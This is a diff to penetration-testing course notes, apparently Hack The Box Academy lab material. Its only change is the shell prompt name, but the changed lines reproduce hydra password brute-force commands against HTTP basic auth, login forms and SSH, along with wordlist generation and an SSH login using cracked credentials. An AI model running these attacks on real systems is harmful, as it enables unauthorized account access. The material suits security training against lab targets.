@@ -165,7 +165,7 @@ We can take a look at the options that `hydra` provides and see its flags and ex
 &#x20; Default Passwords
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -h
+root@htb[/htb]$ hydra -h
 
 Syntax: hydra [[[-l LOGIN|-L FILE] [-p PASS|-P FILE]] | [-C FILE]] [-e nsr] [-o FILE] [-t TASKS] [-M FILE [-T TASKS]] [-w TIME] [-W TIME] [-f] [-s PORT] [-x MIN:MAX:CHARSET] [-c TIME] [-ISOuvVd46] [-m MODULE_OPT] [service://server[:PORT][/OPT]]
 
@@ -214,7 +214,7 @@ The assembled command results:
 &#x20; Default Passwords
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+root@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -248,7 +248,7 @@ One of the most commonly used password wordlists is `rockyou.txt`, which has ove
 &#x20; Username Brute Force
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ locate rockyou.txt
+root@htb[/htb]$ locate rockyou.txt
 
 /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt
 ```
@@ -258,7 +258,7 @@ As for our usernames wordlist, we will utilize the following wordlist from `SecL
 &#x20; Username Brute Force
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ locate names.txt
+root@htb[/htb]$ locate names.txt
 
 /opt/useful/SecLists/Usernames/Names/names.txt
 ```
@@ -280,7 +280,7 @@ Credentials can also be separated by `usernames` and `passwords`. We can use the
 Tip: We will add the "-u" flag, so that it tries all users on each password, instead of trying all 14 million passwords on one user, before moving on to the next.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
+root@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
 
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
 [DATA] attacking http-get://178.35.49.134:32901/
@@ -304,7 +304,7 @@ If we were to only brute force the username or password, we could assign a stati
 Since we already found the password in the previous section, we may statically assign it with the "`-p`" flag, and only brute force for usernames that might use this password.
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
+root@htb[/htb]$ hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -p amormio -u -f 178.35.49.134 -s 32901 http-get /
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra)
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 17 login tries (l:17/p:1), ~2 tries per task
@@ -342,7 +342,7 @@ If none of these credentials grant us access, we could next resort to another wi
 &#x20; Hydra Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
+root@htb[/htb]$ hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
 
 Supported			        ldap3[-{cram|digest}md5][s]	rsh
 services			        memcached					rtsp
@@ -384,7 +384,7 @@ To find out how to use the `http-post-form` module, we can use the "`-U`" flag t
 &#x20; Hydra Modules
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra http-post-form -U
+root@htb[/htb]$ hydra http-post-form -U
 
 <...SNIP...>
 Syntax:   <url>:<form parameters>:<condition string>[:<optional>[:<optional>]
@@ -507,7 +507,7 @@ Another option would be to used `Copy` > `Copy as cURL`, which would copy the en
 &#x20; Determine Login Parameters
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
+root@htb[/htb]$ curl 'http://178.128.40.63:31554/login.php' -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://178.128.40.63:31554' -H 'DNT: 1' -H 'Connection: keep-alive' -H 'Referer: http://178.128.40.63:31554/login.php' -H 'Cookie: PHPSESSID=8iafr4t6c3s2nhkaj63df43v05' -H 'Upgrade-Insecure-Requests: 1' -H 'Sec-GPC: 1' --data-raw 'username=test&password=test'
 ```
 
 As we can see, this command also contains the parameters `--data-raw 'username=test&password=test'`.
@@ -561,7 +561,7 @@ Let's try to use the `ftp-betterdefaultpasslist.txt` list with the default crede
 &#x20; Login Form Attacks
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+root@htb[/htb]$ hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 
 Hydra v9.1 (c) d020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -583,7 +583,7 @@ Since the brute force attack failed using default credentials, we can try to bru
 &#x20; Login Form Attacks
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
+root@htb[/htb]$ hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -617,7 +617,7 @@ Many tools can create a custom password wordlist based on certain information. T
 &#x20; Personalized Wordlists
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ cupp -i
+root@htb[/htb]$ cupp -i
 
 ___________
    cupp.py!                 # Common
@@ -706,7 +706,7 @@ One such tool we can use is [Username Anarchy](https://github.com/urbanadventure
 &#x20; Personalized Wordlists
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
+root@htb[/htb]$ git clone https://github.com/urbanadventurer/username-anarchy.git
 
 Cloning into 'username-anarchy'...
 remote: Enumerating objects: 386, done.
@@ -738,7 +738,7 @@ The command used to attack a login service is fairly straightforward. We simply 
 &#x20; Service Authentication Brute Forcing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+root@htb[/htb]$ hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -757,7 +757,7 @@ We see that it takes some time to finish, but eventually, we get a working pair,
 &#x20; Service Authentication Brute Forcing
 
 ```shell-session
-AbdulrahmanTamim@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22
+root@htb[/htb]$ ssh b.gates@178.35.49.134 -p 22
 
 b.gates@SERVER_IP's password: ********
 
